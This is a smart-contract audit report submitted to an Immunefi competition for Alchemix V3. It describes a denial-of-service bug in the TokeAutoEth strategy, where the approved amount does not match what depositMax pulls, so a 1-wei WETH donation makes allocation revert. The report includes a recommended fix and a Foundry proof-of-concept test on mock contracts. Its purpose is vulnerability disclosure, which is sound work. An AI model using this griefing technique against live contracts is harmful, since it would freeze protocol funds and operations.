# 58449 sc medium tokeautoeth strategy balance approval mismatch dos

**Submitted on Nov 2nd 2025 at 13:20:13 UTC by @T0nraq for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58449
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Summary

The `TokeAutoEth` strategy's `_allocate()` function approves only the requested `amount` to the router but then calls `router.depositMax()`, which attempts to deposit the **entire WETH balance** of the strategy contract. When the strategy's balance exceeds the approval **EVEN BY 1 WEI** (due to residual rewards, previous withdrawal leftovers, or donations), the transaction reverts.

## Vulnerable Code

### Strategy Allocation (Approves only `amount`)

**File**: `src/strategies/mainnet/TokeAutoEth.sol`

```solidity
function _allocate(uint256 amount) internal override returns (uint256) {
    require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than amount");
    
    // Only approves `amount` to router
    TokenUtils.safeApprove(address(weth), address(router), amount);
    
    // But depositMax() tries to deposit entire balance!
    uint256 shares = router.depositMax(autoEth, address(this), 0);
    
    TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
    rewarder.stake(address(this), shares);
    return amount;
}
```

### Router DepositMax (Deposits entire balance)

**Contract**: `AutopilotRouter` ([0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21](https://vscode.blockscan.com/ethereum/0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21))

```solidity
function depositMax(
    IAutopool vault,
    address to,
    uint256 minSharesOut
) public payable override returns (uint256 sharesOut) {
    IERC20 asset = IERC20(vault.asset());
    
    // Uses msg.sender's ENTIRE balance, not approved amount
    uint256 assetBalance = asset.balanceOf(msg.sender);
    uint256 maxDeposit = vault.maxDeposit(to);
    uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
    
    // Attempts to pull `amount` (which may exceed approval)
    pullToken(asset, amount, address(this));

    approve(IERC20(vault.asset()), address(vault), amount);
    return deposit(vault, to, amount, minSharesOut);
}
```

## Vulnerability Details

### The Balance-Approval Mismatch Flow

**Step 1: Strategy approves only requested amount**

```solidity
// Strategy has 100.0000001 WETH (100 from allocation + 0.0000001 from rewards or rounding discrepancies or even donations)
// Allocator requests to allocate 100 WETH
TokenUtils.safeApprove(address(weth), address(router), amount); // Approves 100 WETH
```

**Step 2: Router reads entire balance**

```solidity
// Router checks strategy's balance
uint256 assetBalance = asset.balanceOf(msg.sender); // Returns 100.0000001 WETH
uint256 maxDeposit = vault.maxDeposit(to);          // Returns unlimited
uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance; // amount = 100.0000001 WETH
```

**Step 3: Router attempts to pull more than approved**

```solidity
pullToken(asset, amount, address(this)); // Tries to transfer 100.0000001 WETH
// REVERTS: Only 100 WETH approved, but 100.0000001 WETH requested
```

### How Extra Balance Accumulates

1. **Reward Claims**: When `rewarder.withdraw(claim=true)` is called during deallocations, extra reward tokens are sent to the strategy
2. **Withdrawal Leftovers**: Slippage or rounding in `autoEth.redeem()` may leave dust amounts
3. **Direct Transfers**: Accidental or malicious transfers of >= 1 wei of WETH to the strategy will PERMANENTLY cause the strategy to always revert during deallocation.

### Root Cause

The `AutopilotRouter.depositMax()` function uses `balanceOf(msg.sender)` to determine the deposit amount, completely ignoring the approval. This creates a fundamental mismatch when any extra balance exists in the strategy contract.

## Impact

### Severity Justification

* This will render the startegy completely unuseable as it will always revert.

## Recommended Fix

### Approve Entire Balance

If using `depositMax()` is required, approve the entire balance instead:

```solidity
function _allocate(uint256 amount) internal override returns (uint256) {
    uint256 balance = TokenUtils.safeBalanceOf(address(weth), address(this));
    require(balance >= amount, "Strategy balance is less than amount");
    
    // Approve entire balance to match what depositMax will try to pull
    TokenUtils.safeApprove(address(weth), address(router), balance);
    
    uint256 shares = router.depositMax(autoEth, address(this), 0);
    TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
    rewarder.stake(address(this), shares);
    return amount;
}
```

## References

* **Vulnerable Code**: [src/strategies/mainnet/TokeAutoEth.sol:56](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoEth.sol#L56-L63)
* **Router Contract**: [AutopilotRouter 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21](https://vscode.blockscan.com/ethereum/0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21)

## Proof of Concept

## Proof of Concept

**Test File**: Create/Add snippet to `test/TokeAutoEthBugs.t.sol`

Run with:

```bash
forge test --match-test test_Bug1_maxBalanaceUsage -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title TokeAutoEthBugsTest
 * @notice This test demonstrates two critical bugs in the TokeAutoEthStrategy._allocate() function
 * 
 * BUG: max balance deposit.
 * - router.depositMax() deposits the ENTIRE balance of msg.sender, not just the approved amount
 * - An attacker can send 1 wei of WETH to the strategy contract
 * - This causes router to try depositing more than the approved amount, resulting in a revert
 * 
 */
contract TokeAutoEthBugsTest is Test {
    // Mock contracts
    MockWETH public weth;
    MockAutoEthVault public autoEth;
    MockAutopilotRouter public router;
    MockRewarder public rewarder;
    TokeAutoEthStrategyMock public strategy;
    
    address public attacker = address(0xBEEF);
    address public strategyOwner = address(0xABCD);
    
    function setUp() public {
        // Deploy mocks
        weth = new MockWETH();
        autoEth = new MockAutoEthVault(address(weth));
        rewarder = new MockRewarder();
        router = new MockAutopilotRouter(address(weth), address(autoEth));
        
        // Deploy strategy
        strategy = new TokeAutoEthStrategyMock(
            address(weth),
            address(autoEth),
            address(router),
            address(rewarder)
        );
        
        // Fund strategy with WETH for normal operation
        weth.mint(address(strategy), 100 ether);
    }
    
    /**
     * @notice BUG: 
     * @dev An attacker sends 1 wei of WETH to the strategy, causing allocation to fail
     */
    function test_Bug1_maxBalanaceUsage() public {
        uint256 amountToAllocate = 10 ether;
        
        // Initial balance check
        uint256 initialBalance = weth.balanceOf(address(strategy));
        assertEq(initialBalance, 100 ether);
        
        // ATTACKER FRONTRUNS: Sends 1 wei of WETH to strategy
        vm.prank(attacker);
        weth.mint(address(strategy), 1);
        
        uint256 balanceAfterAttack = weth.balanceOf(address(strategy));
        assertEq(balanceAfterAttack, 100 ether + 1);
        
        // Now when strategy tries to allocate, it will fail
        // The strategy approves only 'amount' but router tries to deposit entire balance
        vm.expectRevert("ERC20: insufficient allowance");
        strategy.allocate(amountToAllocate);
        
        console.log("BUG 1 DEMONSTRATED:");
        console.log("- Strategy approved:", amountToAllocate);
        console.log("- Strategy balance:", balanceAfterAttack);
        console.log("- Router tried to deposit:", balanceAfterAttack);
        console.log("- Result: REVERT - Complete DOS");
    }

}

/**
 * @notice Simplified mock of TokeAutoEthStrategy to demonstrate bugs
 */
contract TokeAutoEthStrategyMock {
    address public immutable weth;
    address public immutable autoEth;
    MockAutopilotRouter public immutable router;
    address public immutable rewarder;
    
    constructor(
        address _weth,
        address _autoEth,
        address _router,
        address _rewarder
    ) {
        weth = _weth;
        autoEth = _autoEth;
        router = MockAutopilotRouter(_router);
        rewarder = _rewarder;
    }
    
    function allocate(uint256 amount) external returns (uint256) {
        require(MockWETH(weth).balanceOf(address(this)) >= amount, "Strategy balance is less than amount");
        
        // BUG: Only approves 'amount' but router will try to deposit ENTIRE balance
        MockWETH(weth).approve(address(router), amount);
        
        // This is where both bugs occur:
        // BUG 1: If balance > amount (due to frontrun), this reverts with insufficient allowance
        // BUG 2: If balance > maxDeposit, only maxDeposit is used, rest is locked
        uint256 shares = router.depositMax(MockAutoEthVault(autoEth), address(this), 0);
        
        MockAutoEthVault(autoEth).approve(address(rewarder), shares);
        MockRewarder(rewarder).stake(address(this), shares);
        
        return amount;
    }
}

/**
 * @notice Mock AutopilotRouter that mimics the real implementation
 */
contract MockAutopilotRouter {
    address public immutable weth;
    address public immutable vault;
    
    constructor(address _weth, address _vault) {
        weth = _weth;
        vault = _vault;
    }
    
    /**
     * @notice This is the actual depositMax implementation that causes the bugs
     * @dev It deposits min(msg.sender balance, maxDeposit) NOT the approved amount
     */
    function depositMax(
        MockAutoEthVault _vault,
        address to,
        uint256 minSharesOut
    ) external returns (uint256 sharesOut) {
        // BUG SOURCE: Uses msg.sender's ENTIRE balance, not approved amount
        uint256 assetBalance = MockWETH(weth).balanceOf(msg.sender);
        uint256 maxDeposit = _vault.maxDeposit(to);
        
        // BUG 2: If assetBalance > maxDeposit, only deposits maxDeposit
        uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
        
        // BUG 1: This will revert if amount > approved amount
        MockWETH(weth).transferFrom(msg.sender, address(_vault), amount);
        
        return _vault.deposit(amount, to);
    }
}

/**
 * @notice Mock WETH token
 */
contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        require(allowance[from][msg.sender] >= amount, "ERC20: insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

/**
 * @notice Mock AutoEth Vault (ERC4626)
 */
contract MockAutoEthVault {
    address public immutable asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    uint256 private _maxDeposit = type(uint256).max;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(address _asset) {
        asset = _asset;
    }
    
    function maxDeposit(address) external view returns (uint256) {
        return _maxDeposit;
    }
    
    function setMaxDeposit(uint256 amount) external {
        _maxDeposit = amount;
    }
    
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        require(assets <= _maxDeposit, "Exceeds max deposit");
        
        totalAssets += assets;
        shares = assets; // 1:1 for simplicity
        totalSupply += shares;
        balanceOf[receiver] += shares;
        
        return shares;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function convertToShares(uint256 assets) external pure returns (uint256) {
        return assets; // 1:1 for simplicity
    }
    
    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares; // 1:1 for simplicity
    }
}

/**
 * @notice Mock Rewarder
 */
contract MockRewarder {
    mapping(address => uint256) public balanceOf;
    
    function stake(address account, uint256 amount) external {
        balanceOf[account] += amount;
    }
    
    function withdraw(address account, uint256 amount, bool claim) external {
        require(balanceOf[account] >= amount, "Insufficient balance");
        balanceOf[account] -= amount;
    }
    
    function earned(address) external pure returns (uint256) {
        return 0;
    }
}

```
